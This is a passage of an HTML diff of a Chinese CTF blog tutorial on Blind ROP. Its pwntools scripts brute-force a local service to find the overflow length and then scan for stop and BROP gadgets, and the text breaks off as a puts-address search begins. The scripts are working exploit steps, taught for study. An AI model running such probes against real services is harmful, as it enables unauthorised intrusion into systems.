@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ROP-BROP - 好好学习</title><meta name="author" content="alextang">
+<meta name="author-link" content="">
+<meta name="description" content="BROP即Blind ROP。如果当题目没有给出二进制文件的时候，就得通过BROP的方式盲打。大概的思路如下： （确定有栈溢出的存在）通过依次增" /><meta name="keywords" content='Pwn, CTF, 二进制' />
+  <meta itemprop="name" content="ROP-BROP">
+  <meta itemprop="description" content="BROP即Blind ROP。如果当题目没有给出二进制文件的时候，就得通过BROP的方式盲打。大概的思路如下： （确定有栈溢出的存在）通过依次增">
+  <meta itemprop="datePublished" content="2023-11-02T16:32:10+08:00">
+  <meta itemprop="dateModified" content="2023-11-02T16:32:10+08:00">
+  <meta itemprop="wordCount" content="1185">
+  <meta itemprop="keywords" content="Pwn,CTF,二进制"><meta property="og:url" content="https://alextang.top/articles/2023/11/rop-brop/">
+  <meta property="og:site_name" content="好好学习">
+  <meta property="og:title" content="ROP-BROP">
+  <meta property="og:description" content="BROP即Blind ROP。如果当题目没有给出二进制文件的时候，就得通过BROP的方式盲打。大概的思路如下： （确定有栈溢出的存在）通过依次增">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-11-02T16:32:10+08:00">
+    <meta property="article:modified_time" content="2023-11-02T16:32:10+08:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="二进制">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ROP-BROP">
+  <meta name="twitter:description" content="BROP即Blind ROP。如果当题目没有给出二进制文件的时候，就得通过BROP的方式盲打。大概的思路如下： （确定有栈溢出的存在）通过依次增">
+      <meta name="twitter:site" content="@a1extang">
+<meta name="application-name" content="a1extang">
+<meta name="apple-mobile-web-app-title" content="a1extang"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://alextang.top/articles/2023/11/rop-brop/" /><link rel="prev" href="https://alextang.top/articles/2023/11/rop-ret2csu/" /><link rel="next" href="https://alextang.top/articles/2023/11/advancerop-ret2dlresolve/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ROP-BROP",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/alextang.top\/articles\/2023\/11\/rop-brop\/"
+    },"genre": "posts","keywords": "Pwn, CTF, 二进制","wordcount":  1185 ,
+    "url": "https:\/\/alextang.top\/articles\/2023\/11\/rop-brop\/","datePublished": "2023-11-02T16:32:10+08:00","dateModified": "2023-11-02T16:32:10+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "alextang"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                title="关于"
+                
+              ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  title="关于"
+                  
+                ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="toc" id="toc-auto"></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ROP-BROP</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=large 2x" sizes="auto" data-title="alextang" data-alt="alextang" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;alextang</span></span>
+          <span class="post-category">收录于 <a href="/categories/pwn/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-11-02 16:32:10"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-11-02">2023-11-02</time></span>&nbsp;<span title="更新于 2023-11-02 16:32:10"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-11-02">2023-11-02</time></span>&nbsp;<span title="1185 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1200 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+    </div><div class="content" id="content"><p>BROP即Blind ROP。如果当题目没有给出二进制文件的时候，就得通过BROP的方式盲打。大概的思路如下：</p>
+<ul>
+<li>（确定有栈溢出的存在）通过依次增加输入数量，确定何时可以覆盖返回地址</li>
+</ul>
+<h1 id="确定溢出长度padding">确定溢出长度（padding）</h1>
+<p>脚本如下：</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getsize</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;WelCome my friend,Do you know password?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;No password&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">i</span><span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">i</span><span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="n">getsize</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;size is [</span><span class="si">{}</span><span class="s2">]&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">size</span><span class="p">))</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里减一是因为程序出错的时候以及覆盖了retn地址，但是我们只希望padding填充满rbp的位置即可。</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698912621847-add41e9a-dd23-4def-80c2-d543dee098d7.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698912621847-add41e9a-dd23-4def-80c2-d543dee098d7.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698912621847-add41e9a-dd23-4def-80c2-d543dee098d7.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698912621847-add41e9a-dd23-4def-80c2-d543dee098d7.png?size=large 2x" sizes="auto" data-title="img" data-alt="img" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>结果如上，说明需要填充72个字符。</p>
+<h1 id="寻找stop_gadgets">寻找stop_gadgets</h1>
+<p>stop_gadgets可以理解为main的地址或者__libc_start_main的地址。我们不能让payload执行完直接退出，为了多次执行，必须找到一个可以返回的地址。</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getStopGadgets</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x4005b0</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="k">try</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">			<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">length</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;know password?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">output</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;password?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;one success addr 0x</span><span class="si">%x</span><span class="s2">:&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="ow">not</span> <span class="n">output</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;WelCome&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">				<span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">				<span class="n">addr</span><span class="o">+=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">			<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl">		<span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">addr</span><span class="o">+=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">			<span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">stop_gadgets</span> <span class="o">=</span> <span class="n">getStopGadgets</span><span class="p">(</span><span class="n">length</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>PS：64位程序的加载地址从0x400000开始</p>
+<p>这里得到的地址就是start（本地未跑成功，原因未知）</p>
+<h1 id="寻找brop_gadgets">寻找brop_gadgets</h1>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># stop gadget returns memory</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#if not content.startswith(&#39;WelCome&#39;):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#    return False</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;password?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##length = getbufferflow_length()</span>
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##get_stop_addr(length)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4005c0</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400740</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#######get_brop_gadgets_addr#######</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">get_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;possible brop gadget: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">check_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;success brop gadget: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>找到了可用的gadgets</p>
+<h1 id="寻找put地址">寻找put地址</h1>
+<p>原理是打印出ELF头的几个字节，如果可以，就是了</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##length = getbufferflow_length()</span>
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##get_stop_addr(length)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4005c0</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400740</span>
+</span></span><span class="line"><span class="cl">
